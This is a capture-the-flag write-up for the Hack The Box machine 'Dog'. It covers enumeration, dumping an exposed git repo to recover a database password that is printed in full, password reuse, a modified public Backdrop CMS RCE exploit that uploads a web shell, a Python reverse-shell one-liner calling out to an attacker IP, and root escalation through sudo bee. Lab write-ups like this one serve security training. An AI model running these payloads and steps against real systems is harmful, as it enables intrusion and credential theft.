---
hidden: true
---

# Dog

## Machine Informations





## Port Scanning

```bash
nmap -T4 -sV -p- --min-rate 1000 --open -oN port_scan.txt 10.10.11.58

Nmap scan report for 10.10.11.58
Host is up (0.040s latency).
Not shown: 60996 closed tcp ports (reset), 4537 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```



## Web Enumeration

### File Enum

{% code overflow="wrap" %}
```bash
gobuster dir -u http://dog.htb/ -w /usr/share/wordlists/SecLists/raft-large-files.txt -b 403,404 -k

[..snip..]
/index.php            (Status: 200) [Size: 13260]
/LICENSE.txt          (Status: 200) [Size: 18092]
/robots.txt           (Status: 200) [Size: 1198]
/settings.php         (Status: 200) [Size: 0]
/.git                 (Status: 301) [Size: 301] [--> http://dog.htb/.git/]
[..snip..]
```
{% endcode %}

```bash
curl http://dog.htb/robots.txt

User-agent: *
Crawl-delay: 10
# Directories
Disallow: /core/
Disallow: /profiles/
# Files
Disallow: /README.md
Disallow: /web.config
# Paths (clean URLs)
Disallow: /admin
Disallow: /comment/reply
Disallow: /filter/tips
Disallow: /node/add
Disallow: /search
Disallow: /user/register
Disallow: /user/password
Disallow: /user/login
Disallow: /user/logout
# Paths (no clean URLs)
Disallow: /?q=admin
Disallow: /?q=comment/reply
Disallow: /?q=filter/tips
Disallow: /?q=node/add
Disallow: /?q=search
Disallow: /?q=user/password
Disallow: /?q=user/register
Disallow: /?q=user/login
Disallow: /?q=user/logout
```



### Dir Enum



{% code overflow="wrap" %}
```bash
gobuster dir -u http://dog.htb/ -w /usr/share/wordlists/SecLists/raft-large-directories.txt -b 403,404 -k

/modules              (Status: 301) [Size: 304] [--> http://dog.htb/modules/]
/themes               (Status: 301) [Size: 303] [--> http://dog.htb/themes/]
/sites                (Status: 301) [Size: 302] [--> http://dog.htb/sites/]
/files                (Status: 301) [Size: 302] [--> http://dog.htb/files/]
/core                 (Status: 301) [Size: 301] [--> http://dog.htb/core/]
/layouts              (Status: 301) [Size: 304] [--> http://dog.htb/layouts/]
```
{% endcode %}

In the /files directory we'll discover some interesting file.

{% code overflow="wrap" %}
```bash
curl http://dog.htb/files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json

[..snip..]
"update_emails": [
        "tiffany@dog.htb"
    ],
[..snip..]
```
{% endcode %}



### Git repo dump

From directories enumeration we can look a .git folder. Try to dump the repo with git-dumper tool.

```bash
git-dumper http://dog.htb/.git ./repo-dumped
```

Read the settings.php file and we can get a root password of database.&#x20;

```bash
cat settings.php

[..snip..]
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
[..snip..]
```

### Password reuse

Try to login in the portal using the password found in the `settings.php` file and the user found in the `/files` directory.

<figure><img src="../../../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>

We get in

<figure><img src="../../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>



### Public Exploit - Backdrop CMS 1.27.1 - Authenticated RCE

The version of backdrop is the 1.27.1, search it on google we have found a public exploit about a Authenticated Remote Code Execution.&#x20;

{% embed url="https://www.exploit-db.com/exploits/52021" %}

The exploit contains a methods to create a .zip payload with a shell inside to be installed as a module in the backdrop control panel.

```bash
searchsploit -m 52021 # copy the public exploit

python3 52021.py http://dog.htb # generate shell.zip payload
```

<figure><img src="../../../.gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>

The script will create a .zip file and the control panel don't allow us to upload this type of file.

We could change the exploit adding this method:

```python
def create_tar(info_path, php_path):
    tar_filename = "shell.tar"
    with tarfile.open(tar_filename, 'w') as tarf:
        tarf.add(info_path, arcname='shell/shell.info')
        tarf.add(php_path, arcname='shell/shell.php')
    return tar_filename
```

This method will creates a .tar dir with the same content of .zip dir, and allow us to upload the payload

<figure><img src="../../../.gitbook/assets/image (77).png" alt=""><figcaption></figcaption></figure>

Now search this URL and we get a shell:

```bash
http://dog.htb/modules/shell/shell.php?cmd=id
```

<figure><img src="../../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

Generate a rev shell payload to get reverse shell via terminal.

{% code title="Python3 RevShell" overflow="wrap" %}
```python
export RHOST="10.10.14.108";export RPORT=9009;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```
{% endcode %}

```bash
nc -lnvp 9009
```

### User Enumeration

Once we have in as www-data user we can read the content of /home directory to discover all user.&#x20;

```bash
ls -la /home

drwxr-xr-x  4 jobert     jobert     4096 Feb  7 15:59 jobert
drwxr-xr-x  3 johncusack johncusack 4096 Feb  7 15:59 johncusack
```

### User.flag

Now we can try to do a password spray with these two users and the password found in the `setting.php` file.

```bash
ssh johncusack@10.10.11.58
> BackDropJ2024DS2024
```

We are in as johncusack user. Let's read the flag

```bash
cat /home/johncusack/flag.txt
```



## Privilege Escalation

If we print the / directory we can notice a juicy directory

```bash
ls -la /

[..snip..]
drwxr-xr-x   3 root root  4096 Jul  9  2024 backdrop_tool
[..snip..]
```

Check the sudo permission of the user:

```bash
sudo -l

Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee

```

We can see that the user has sudo permission to run bee tool.

Searching what is it.&#x20;

{% embed url="https://backdropcms.org/project/bee" %}

> Bee is a command line utility for Backdrop CMS. It includes commands that allow developers to interact with Backdrop sites, performing actions like:
>
> * Running cron
> * Clearing caches
> * Downloading and installing Backdrop
> * Downloading, enabling and disabling projects
> * Viewing information about a site and/or available projects



Viewing the list of command that we can execute with bee, i notice a command that allow us to execute a arbitrary PHP code into machine as root.

Write a reverse shell in php and put it in a file in /tmp directory. Then, start a listener from attack machine and run this command:&#x20;

```bash
sudo bee --site=/var/www/html/index.php php-script /tmp/shell.php
```

### Get a shell as root

<figure><img src="../../../.gitbook/assets/image (195).png" alt=""><figcaption></figcaption></figure>

### Root.flag

Now that we have a shell as root, We print the root flag.

```bash
cat /root/root.txt
```









